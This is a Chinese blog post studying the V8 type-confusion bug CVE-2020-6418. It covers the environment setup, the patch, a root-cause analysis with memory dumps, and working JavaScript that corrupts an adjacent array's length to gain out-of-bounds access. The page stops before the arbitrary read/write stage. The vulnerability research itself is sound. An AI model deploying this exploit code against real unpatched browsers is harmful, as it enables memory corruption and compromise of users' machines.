<!DOCTYPE html>
<html lang="zh-CN">





<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="摸鱼">
  <meta name="author" content="Aluvion">
  <meta name="keywords" content="">
  <title>chrome浏览器漏洞强化3-CVE-2020-6418 - Twings</title>

  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />

<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">



  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />

<link  rel="stylesheet" href="/css/main.css" />


  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />


<!-- 自定义样式保持在最底部 -->


<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/">首页</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/archives/">归档</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/tags/">标签</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/about/">关于</a>
          </li>
        
          
          
          
          
          <li class="nav-item">
            <a class="nav-link" href="/links/">友链</a>
          </li>
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="view intro-2" id="background" parallax=true
         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask rgba-black-light flex-center">
          <div class="container text-center white-text fadeInUp">
            <span class="h2" id="subtitle">
              
            </span>

            
              
                <p class="mt-3 post-meta">
                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
                  星期二, 四月 27日 2021, 11:05 晚上
                </p>
              

              <p class="mt-1">
                
                  
                  <span class="post-meta">
                    <i class="far fa-chart-bar"></i>
                    3.3k 字
                  </span>
                

                
                  
                  <span class="post-meta">
                      <i class="far fa-clock"></i>
                      17 分钟
                  </span>
                

                
                  <!-- 不蒜子统计文章PV -->
                  
                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
                    <i class="far fa-eye" aria-hidden="true"></i>
                    <span id="busuanzi_value_page_pv"></span> 次
                  </span>
                
              </p>
            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid">
  <div class="row">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-md">
      <div class="container nopadding-md" id="board-ctn">
        <div class="py-5 z-depth-3" id="board">
          <div class="post-content mx-auto" id="post">
            
            <div class="markdown-body">
              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p> 强化中，准备做作业用。</p>
<span id="more"></span>

<hr>
<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>同样去chrome官网的bug页面看看<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1053604">这个bug</a>，找到对应的<a href="https://chromium.googlesource.com/v8/v8.git/+/fb0a60e15695466621cf65932f9152935d859447">修复补丁</a>和需要回滚到的<a href="https://chromium.googlesource.com/v8/v8.git/+/fb0a60e15695466621cf65932f9152935d859447%5E">漏洞版本</a>。</p>
<p>下载源码开始编译：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">yum groupinstall &quot;Development Tools&quot;</span><br><span class="line">yum install python2</span><br><span class="line">ln -s /usr/bin/python2 /usr/bin/python</span><br><span class="line">yum install -y git gdb bzip2 wget</span><br><span class="line">cd ~</span><br><span class="line">git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git</span><br><span class="line">export PATH=`pwd`/depot_tools:&quot;$PATH&quot;</span><br><span class="line">mkdir v8</span><br><span class="line">cd v8</span><br><span class="line">fetch v8</span><br><span class="line">cd ~/v8/v8</span><br><span class="line">git reset --hard bdaa7d66a37adcc1f1d81c9b0f834327a74ffe07 # CVE-2020-6418漏洞分支</span><br><span class="line">gclient sync</span><br><span class="line">./tools/dev/v8gen.py x64.release</span><br><span class="line">ninja -C ./out.gn/x64.release # Release version</span><br><span class="line">./tools/dev/v8gen.py x64.debug</span><br><span class="line">ninja -C ./out.gn/x64.debug # Debug version</span><br></pre></td></tr></table></figure>

<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>首先看看patch，修改的是node-properties.cc这个文件：</p>
<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">diff --git a/src/compiler/node-properties.cc b/src/compiler/node-properties.cc</span></span><br><span class="line"><span class="comment">index f43a348..ab4ced6 100644</span></span><br><span class="line"><span class="comment">--- a/src/compiler/node-properties.cc</span></span><br><span class="line"><span class="comment">+++ b/src/compiler/node-properties.cc</span></span><br><span class="line"><span class="meta">@@ -386,6 +386,7 @@</span></span><br><span class="line">           // We reached the allocation of the &#123;receiver&#125;.</span><br><span class="line">           return kNoReceiverMaps;</span><br><span class="line">         &#125;</span><br><span class="line"><span class="addition">+        result = kUnreliableReceiverMaps;  // JSCreate can have side-effect.</span></span><br><span class="line">         break;</span><br><span class="line">       &#125;</span><br><span class="line">       case IrOpcode::kJSCreatePromise: &#123;</span><br></pre></td></tr></table></figure>

<p>这段代码位于InferReceiverMapsUnsafe函数中，原本代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> IrOpcode::kJSCreate: &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">IsSame</span>(receiver, effect)) &#123;</span><br><span class="line">        base::Optional&lt;MapRef&gt; initial_map = <span class="built_in">GetJSCreateMap</span>(broker, receiver);</span><br><span class="line">        <span class="keyword">if</span> (initial_map.<span class="built_in">has_value</span>()) &#123;</span><br><span class="line">            *maps_return = <span class="built_in">ZoneHandleSet</span>&lt;Map&gt;(initial_map-&gt;<span class="built_in">object</span>());</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// We reached the allocation of the &#123;receiver&#125;.</span></span><br><span class="line">        <span class="keyword">return</span> kNoReceiverMaps;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数会检查receiver（一般指的是操作的主体）及effect（大概就是主体要做的操作），从而确认后续的effect是否会影响这个主体的Map。这里多加的一行代码给result赋值了kUnreliableReceiverMap，意思大概就是说这个receiver的Map不可信，需要加以检查。</p>
<p>回去阅读漏洞说明：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Incorrect side effect modelling for JSCreate</span><br><span class="line"></span><br><span class="line">The function NodeProperties::InferReceiverMapsUnsafe [1] is responsible for inferring the Map of an object. From the documentation: &quot;This information can be either &quot;reliable&quot;, meaning that the object is guaranteed to have one of these maps at runtime, or &quot;unreliable&quot;, meaning that the object is guaranteed to have HAD one of these maps.&quot;. In the latter case, the caller has to ensure that the object has the correct type, either by using CheckMap nodes or CodeDependencies.</span><br><span class="line"></span><br><span class="line">On a high level, the InferReceiverMapsUnsafe function traverses the effect chain until it finds the node creating the object in question and, at the same time, marks the result as unreliable if it encounters a node without the kNoWrite flag [2], indicating that executing the node could have side-effects such as changing the Maps of an object. There is a mistake in the handling of kJSCreate [3]: if the object in question is not the output of kJSCreate, then the loop continues *without* marking the result as unreliable. This is incorrect because kJSCreate can have side-effects, for example by using a Proxy as third argument to Reflect.construct. The bug can then for example be triggered by inlining Array.pop and changing the elements kind from SMIs to Doubles during the unexpected side effect.</span><br></pre></td></tr></table></figure>

<p>被修改的InferReceiverMapsUnsafe函数负责通过遍历effect链的方式来推测一个对象的Map，如果是不可信的，caller就需要通过CheckMap或者CodeDependencies节点来确保这个对象的类型是正确的。</p>
<p>此次漏洞的问题在于JIT优化过程在遇到kJSCreate操作时，InferReceiverMapsUnsafe函数会错误地认为其不存在改变对象Map的操作，不会将其推测为不可信，进而在优化代码中不会对其Map进行检查。而实际上，如果使用Proxy作为Reflect.consutruct的第三个参数，然后通过pop函数触发回调函数的方式可以在kJSCreate操作改变对象Map，进而由于缺乏检查的缘故导致了类型混淆漏洞。</p>
<p>在JIT优化过程中，优化pop函数的是ReduceArrayPrototypePop函数，其关键代码如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">MapInference <span class="title">inference</span><span class="params">(broker(), receiver, effect)</span></span>;</span><br><span class="line"><span class="keyword">if</span> (!inference.<span class="built_in">HaveMaps</span>()) <span class="keyword">return</span> <span class="built_in">NoChange</span>();</span><br><span class="line">MapHandles <span class="type">const</span>&amp; receiver_maps = inference.<span class="built_in">GetMaps</span>();</span><br><span class="line"></span><br><span class="line">std::vector&lt;ElementsKind&gt; kinds;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">CanInlineArrayResizingBuiltin</span>(<span class="built_in">broker</span>(), receiver_maps, &amp;kinds)) &#123;</span><br><span class="line">    <span class="keyword">return</span> inference.<span class="built_in">NoChange</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">dependencies</span>()-&gt;<span class="built_in">DependOnNoElementsProtector</span>()) <span class="built_in">UNREACHABLE</span>();</span><br><span class="line">inference.<span class="built_in">RelyOnMapsPreferStability</span>(<span class="built_in">dependencies</span>(), <span class="built_in">jsgraph</span>(), &amp;effect,</span><br><span class="line">                                    control, p.<span class="built_in">feedback</span>());</span><br></pre></td></tr></table></figure>

<p>inference就是调用InferReceiverMapsUnsafe函数推测对象Map是否可信的一个变量，其构造函数如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MapInference::<span class="built_in">MapInference</span>(JSHeapBroker* broker, Node* object, Node* effect)</span><br><span class="line">    : <span class="built_in">broker_</span>(broker), <span class="built_in">object_</span>(object) &#123;</span><br><span class="line">        ZoneHandleSet&lt;Map&gt; maps;</span><br><span class="line">        <span class="keyword">auto</span> result =</span><br><span class="line">            NodeProperties::<span class="built_in">InferReceiverMapsUnsafe</span>(broker_, object_, effect, &amp;maps);</span><br><span class="line">        maps_.<span class="built_in">insert</span>(maps_.<span class="built_in">end</span>(), maps.<span class="built_in">begin</span>(), maps.<span class="built_in">end</span>());</span><br><span class="line">        maps_state_ = (result == NodeProperties::kUnreliableReceiverMaps)</span><br><span class="line">            ? kUnreliableDontNeedGuard</span><br><span class="line">            : kReliableOrGuarded;</span><br><span class="line">        <span class="built_in">DCHECK_EQ</span>(maps_.<span class="built_in">empty</span>(), result == NodeProperties::kNoReceiverMaps);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>RelyOnMapsPreferStability函数就是根据Map是否可信来确定是否需要加入CheckMaps节点进行Map检查，其定义如下：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MapInference::Safe</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> maps_state_ != kUnreliableNeedGuard; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MapInference::RelyOnMapsPreferStability</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    CompilationDependencies* dependencies, JSGraph* jsgraph, Node** effect,</span></span></span><br><span class="line"><span class="params"><span class="function">    Node* control, <span class="type">const</span> FeedbackSource&amp; feedback)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">CHECK</span>(<span class="built_in">HaveMaps</span>());</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Safe</span>()) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">RelyOnMapsViaStability</span>(dependencies)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">CHECK</span>(<span class="built_in">RelyOnMapsHelper</span>(<span class="literal">nullptr</span>, jsgraph, effect, control, feedback));</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">MapInference::RelyOnMapsHelper</span><span class="params">(CompilationDependencies* dependencies,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    JSGraph* jsgraph, Node** effect,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    Node* control,</span></span></span><br><span class="line"><span class="params"><span class="function">                                    <span class="type">const</span> FeedbackSource&amp; feedback)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">Safe</span>()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span> is_stable = [<span class="keyword">this</span>](Handle&lt;Map&gt; map) &#123;</span><br><span class="line">        MapRef <span class="built_in">map_ref</span>(broker_, map);</span><br><span class="line">        <span class="keyword">return</span> map_ref.<span class="built_in">is_stable</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (dependencies != <span class="literal">nullptr</span> &amp;&amp;</span><br><span class="line">        std::<span class="built_in">all_of</span>(maps_.<span class="built_in">cbegin</span>(), maps_.<span class="built_in">cend</span>(), is_stable)) &#123;</span><br><span class="line">        <span class="keyword">for</span> (Handle&lt;Map&gt; map : maps_) &#123;</span><br><span class="line">            dependencies-&gt;<span class="built_in">DependOnStableMap</span>(<span class="built_in">MapRef</span>(broker_, map));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">SetGuarded</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (feedback.<span class="built_in">IsValid</span>()) &#123;</span><br><span class="line">        <span class="built_in">InsertMapChecks</span>(jsgraph, effect, control, feedback);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通过这个类型混淆漏洞能做些什么，可以从官方给出的测试代码中分析一下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">ITERATIONS</span> = <span class="number">10000</span>;</span><br><span class="line"><span class="variable constant_">TRIGGER</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">a, p</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> a.<span class="title function_">pop</span>(<span class="title class_">Reflect</span>.<span class="title function_">construct</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;, <span class="variable language_">arguments</span>, p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">TRIGGER</span>) &#123;</span><br><span class="line">            a[<span class="number">2</span>] = <span class="number">1.1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable constant_">ITERATIONS</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> isLastIteration = i == <span class="variable constant_">ITERATIONS</span> - <span class="number">1</span>;</span><br><span class="line">    a = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line">    <span class="keyword">if</span> (isLastIteration)</span><br><span class="line">        <span class="variable constant_">TRIGGER</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">print</span>(<span class="title function_">f</span>(a, p));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用release版本运行后可以发现，最后一次pop返回的是一个奇特的数字-858993459。调试一下，在数组a从SMI数组变成Double数组之前，其elements内存布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2a5e08728e05: [JSArray]</span><br><span class="line"> - map: 0x2a5e082817f1 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2a5e08248f7d &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2a5e08250199 &lt;FixedArray[5]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 5</span><br><span class="line"> - properties: 0x2a5e080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2a5e081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2a5e08250199 &lt;FixedArray[5]&gt; &#123;</span><br><span class="line">           0: 0</span><br><span class="line">           1: 1</span><br><span class="line">           2: 2</span><br><span class="line">           3: 3</span><br><span class="line">           4: 4</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xw 0x2a5e08250198</span><br><span class="line">0x2a5e08250198:	0x080404d9	0x0000000a	0x00000000	0x00000002</span><br><span class="line">0x2a5e082501a8:	0x00000004	0x00000006	0x00000008	0x080411c9</span><br><span class="line">0x2a5e082501b8:	0x00000000	0x08250199	0x08040489	0x00000000</span><br><span class="line">0x2a5e082501c8:	0x080404b1	0x00000014	0x08250055	0x0824ff61</span><br><span class="line">0x2a5e082501d8:	0x0824ff79	0x08042931	0x080427dd	0x08250185</span><br></pre></td></tr></table></figure>

<p>每4个字节为一个地址单元，前两个地址单元代表Map、elements数量，后5个地址单元存放SMI数据，一共占据了28字节的空间。</p>
<p>变成Double数组后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">DebugPrint: 0x2a5e08728e05: [JSArray]</span><br><span class="line"> - map: 0x2a5e08281891 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2a5e08248f7d &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x2a5e08728eed &lt;FixedDoubleArray[5]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 5</span><br><span class="line"> - properties: 0x2a5e080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x2a5e081c0165 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x2a5e08728eed &lt;FixedDoubleArray[5]&gt; &#123;</span><br><span class="line">           0: 0</span><br><span class="line">           1: 1</span><br><span class="line">           2: 1.1</span><br><span class="line">           3: 3</span><br><span class="line">           4: 4</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; x/20xw 0x2a5e08728eec</span><br><span class="line">0x2a5e08728eec:	0x08040a3d	0x0000000a	0x00000000	0x00000000</span><br><span class="line">0x2a5e08728efc:	0x00000000	0x3ff00000	0x9999999a	0x3ff19999</span><br><span class="line">0x2a5e08728f0c:	0x00000000	0x40080000	0x00000000	0x40100000</span><br><span class="line">0x2a5e08728f1c:	0xbeadbeef	0xbeadbeef	0xbeadbeef	0xbeadbeef</span><br><span class="line">0x2a5e08728f2c:	0xbeadbeef	0xbeadbeef	0xbeadbeef	0xbeadbeef</span><br></pre></td></tr></table></figure>

<p>因为数组类型发生了变化，所以v8重新分配了一块内存来存放elements，可以看到elements指针指向的地址发生了变化。此外，由于数组类型从SMI转换为了Double，每个成员的占用空间从4字节变成了8字节，由于缺乏检查的缘故，如果还以SMI的方式访问该数组，就会访问到Double数组a中的a[2]的低32位数据，即0x9999999a，再根据SMI的处理方式右移一位得到最后的结果，我们将-858993459左移一位可以得到其在内存中的形态：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x -858993459&lt;&lt;1</span><br><span class="line">$1 = 0x9999999a</span><br></pre></td></tr></table></figure>

<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>在紧贴数组a的后方内存处分配一个Double数组，然后通过push进行越界写，我们就能获得一个可以进一步进行更大范围越界读写的Double数组：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">ITERATIONS</span> = <span class="number">10000</span>;</span><br><span class="line"><span class="variable constant_">TRIGGER</span> = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">empty</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params">a, p</span>) &#123;</span><br><span class="line">    a.<span class="title function_">push</span>(<span class="title function_">typeof</span>(<span class="title class_">Reflect</span>.<span class="title function_">construct</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;, <span class="variable language_">arguments</span>, p)) === <span class="title class_">Proxy</span>? <span class="number">1.1</span>: <span class="number">8.063e-320</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> a, b;</span><br><span class="line"><span class="keyword">let</span> p = <span class="keyword">new</span> <span class="title class_">Proxy</span>(<span class="title class_">Object</span>, &#123;</span><br><span class="line">    <span class="attr">get</span>: <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable constant_">TRIGGER</span>) &#123;</span><br><span class="line">            a[<span class="number">0</span>] = &#123;&#125;;</span><br><span class="line">            b = [<span class="number">1.1</span>, <span class="number">2.2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable constant_">ITERATIONS</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> isLastIteration = i == <span class="variable constant_">ITERATIONS</span> - <span class="number">1</span>;</span><br><span class="line">    a = [,,,,,,,,,,,,,, <span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>];</span><br><span class="line">    a.<span class="title function_">pop</span>();</span><br><span class="line">    a.<span class="title function_">pop</span>();</span><br><span class="line">    a.<span class="title function_">pop</span>();</span><br><span class="line">    <span class="keyword">if</span> (isLastIteration)</span><br><span class="line">        <span class="variable constant_">TRIGGER</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_">f</span>(a, empty);</span><br><span class="line">    <span class="title function_">f</span>(a, empty);</span><br><span class="line">    <span class="title function_">f</span>(a, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">print</span>(b.<span class="property">length</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到，此时数组b的长度已经被我们覆写成了8160。下一步就是实现任意地址读写，参考文章给出这么一种内存布局方式：</p>
